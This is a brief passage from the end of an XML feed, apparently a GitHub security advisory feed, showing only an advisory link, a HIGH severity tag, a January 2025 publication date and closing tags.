            <uri>https://github.com/advisories/GHSA-c6fv-7vh8-2rhr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-03T17:06:23.000Z</published>
    </entry>
</feed>